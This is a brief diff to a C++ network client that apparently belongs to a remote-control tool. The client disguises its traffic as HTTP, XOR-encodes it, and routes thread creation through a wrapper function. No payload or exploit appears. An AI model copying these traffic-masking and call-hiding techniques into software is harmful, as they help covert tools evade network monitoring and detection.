@@ -103,6 +103,7 @@ IOCPClient::IOCPClient(State&bExit, bool exit_while_disconnect, int mask, int en
 	m_Manager = NULL;
 	m_masker = mask ? new HttpMask("example.com") : new PkgMask();
 	auto enc = GetHeaderEncoder(HeaderEncType(time(nullptr) % HeaderEncNum));
+	m_EncoderType = encoder;
 	m_Encoder = encoder ? new HellEncoder(enc, new XOREncoder16()) : new ProtocolEncoder();
 #ifdef _WIN32
 	WSADATA wsaData;
@@ -268,7 +269,7 @@ BOOL IOCPClient::ConnectServer(const char* szServerIP, unsigned short uPort)
 	}
 	if (m_hWorkThread == NULL){
 #ifdef _WIN32
-		m_hWorkThread = (HANDLE)CreateThread(NULL, 0, WorkThreadProc,(LPVOID)this, 0, NULL);
+		m_hWorkThread = (HANDLE)__CreateThread(NULL, 0, WorkThreadProc,(LPVOID)this, 0, NULL);
 		m_bWorkThread = m_hWorkThread ? S_RUN : S_STOP;
 #else
 		pthread_t id = 0;
